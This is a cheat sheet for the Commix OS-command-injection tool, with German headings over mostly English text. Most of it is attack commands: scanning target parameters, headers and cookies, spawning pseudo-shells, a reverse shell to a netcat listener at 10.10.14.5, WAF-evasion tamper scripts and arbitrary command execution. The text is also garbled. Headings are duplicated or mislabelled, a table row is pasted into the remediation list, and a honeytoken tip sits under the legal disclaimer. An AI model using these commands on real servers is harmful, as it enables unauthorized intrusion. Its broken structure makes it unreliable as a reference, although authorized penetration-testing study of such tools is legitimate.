# 💉 Commix – vollständiger Spickzettel

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)



```
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗██╗██╗  ██╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██║╚██╗██╔╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║██║ ╚███╔╝ 
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██║ ██╔██╗ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║██╔╝ ██╗
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
       [COMM]and [I]njection E[X]ploiter - Automated OS Command Injection
```

<p align="center">
  <img src="https://img.shields.io/badge/Commix-Command_Injection-blue?style=for-the-badge" alt="Commix">
  <img src="https://img.shields.io/badge/Author-Anastasios_Stasinopoulos-orange?style=for-the-badge" alt="ancst">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/License-GPLv3-red?style=for-the-badge" alt="License GPLv3">
</p>

<p align="center">
  <b>🌐 Automated tool designed to detect and exploit Command Injection vulnerabilities in web applications and spawn interactive shells</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-overview--the-command-injection-primitive)
- [Installation](#-installation)
- [Basic Vulnerability Scanning](#-basic-vulnerability-scanning)
- [Injecting Different HTTP Elements](#-injecting-different-http-elements)
  - [Optionen und Parameter](#get-parameters)
  - [🔍 Injecting Different HTTP Elements](#post-data---data)
  - [Use the `INJECT_HERE` tag if multiple parameters exist:](#http-headers--cookies)
- [Spawning Interactive & Reverse Shells](#-spawning-interactive--reverse-shells)
  - [Pseudo-Shell (`--os-shell`)](#pseudo-shell---os-shell)
  - [Pseudo-Shell (`--os-shell`)](#native-reverse-shell---reverse-ip)
- [WAF Evasion & Tamper Scripts (`--tamper`)](#-waf-evasion--tamper-scripts---tamper)
- [File-Based & Time-Based Blind Techniques](#-file-based--time-based-blind-techniques)
- [Kurzreferenz](#-quick-reference-table)
- [Defensive Considerations & Remediation](#-defensive-considerations--remediation)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Einführung

While **SQLMap** automates SQL injection, **Commix** (created by **Anastasios Stasinopoulos**) is the gold standard for finding and exploiting **OS Command Injection** flaws.

When web applications unsafely pass user inputs directly to operating system execution functions (`system()`, `exec()`, `passthru()`, `Runtime.getRuntime().exec()`), attackers can append arbitrary shell commands. Commix detects results-based, output-based, time-based blind, and file-based injection vectors automatically.

---

## 📥 Installation

```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y commix

# Clone from GitHub (Latest Version)
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```

---

## 🚀 Basic Vulnerability Scanning

```bash
# Scan a URL with GET parameters
commix -u "http://target.local/status.php?addr=127.0.0.1"

# Automatically answer Yes to all interactive prompts (Batch mode)
commix -u "http://target.local/ping.php?host=localhost" --batch
```

---

## 🔍 Injecting Different HTTP Elements

### Optionen und Parameter
Use the `INJECT_HERE` tag if multiple parameters exist:
```bash
commix -u "http://target.local/view.php?page=INJECT_HERE&user=admin"
```

### 🔍 Injecting Different HTTP Elements
```bash
# Test POST body parameters
commix -u "http://target.local/diagnostics.php" --data="ip=127.0.0.1&action=ping"

# Replay an HTTP request captured directly in Burp Suite
commix -r request.req
```

### Use the `INJECT_HERE` tag if multiple parameters exist:
```bash
# Test User-Agent header for command injection
commix -u "http://target.local/index.php" --user-agent="test" --level=3

# Inject through authenticated session cookies
commix -u "http://target.local/admin.php" --cookie="PHPSESSID=abc123xyz"
```

---

## 💀 Spawning Interactive & Reverse Shells

### Pseudo-Shell (`--os-shell`)

When injection is confirmed, Commix provides an emulated pseudo-terminal directly within the console:

```bash
commix -u "http://target.local/ping.php?ip=127.0.0.1" --os-shell
```

### Pseudo-Shell (`--os-shell`)

When injection is confirmed, Commix provides an emulated pseudo-terminal directly within the console:

```bash
# 1. Start a Netcat listener on your machine
nc -lvnp 4444

# 2. Trigger native reverse shell via Commix
commix -u "http://target.local/ping.php?ip=127.0.0.1" \
  --reverse-ip=10.10.14.5 --reverse-port=4444
```

---

## 🥷 WAF Evasion & Tamper Scripts (`--tamper`)

Bypass Web Application Firewalls (WAF) and string blacklists using built-in obfuscation tampering:

```bash
# List available tamper scripts
commix --list-tampers

# Use IFS whitespace bypass (replaces spaces with ${IFS})
commix -u "http://target.local/exec.php?cmd=test" --tamper=space2ifs

# Hex encode all injection strings
commix -u "http://target.local/exec.php?cmd=test" --tamper=hexencode
```

---

## ⏱️ File-Based & Time-Based Blind Techniques

When output is not rendered back into the HTTP response:

```bash
# Force Time-Based Blind evaluation
commix -u "http://target.local/blind.php?id=1" --technique=T

# Force File-Based injection (writes command output to web root /tmp/)
commix -u "http://target.local/upload.php?f=file" --technique=F --web-root="/var/www/html/"
```

---

## ⚡ Kurzreferenz

|Objective|Befehl|
|-----------|---------|
|**Scan GET Parameter**|`commix -u "<URL>?param=val"`|
|**Scan POST Parameter**|`commix -u "<URL>" --data="param=val"`|
|**Batch Non-Interactive Scan**|`commix -u "<URL>" --batch`|
|**Interactive Terminal Shell**|`commix -u "<URL>" --os-shell`|
|**Drop Reverse Shell**|`commix -u "<URL>" --reverse-ip=<IP> --reverse-port=<PORT>`|
|**Replay Burp Request**|`commix -r burp_request.req`|
|**Use Space Tamper**|`commix -u "<URL>" --tamper=space2ifs`|
|**Execute Single Command**|`commix -u "<URL>" --os-cmd="whoami; id"`|

---

## 🛡️ Defensive Considerations & Remediation

|**Execute Single Command**|`commix -u "<URL>" --os-cmd="whoami; id"`|
2. **Use Native Language APIs:** Replace system utilities with native programming language libraries (e.g., use Python's `socket` library rather than executing the system `ping` binary).
3. **Strict Whitelisting:** If user input must dictate program execution, validate input against a strict alphanumeric whitelist before invocation.

---

## ⚠️ Legal Disclaimer

3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
> Commix automates arbitrary command execution on target servers. Fuzzing or exploiting unauthorized web applications is illegal. Use only on systems where you possess explicit written authorization.
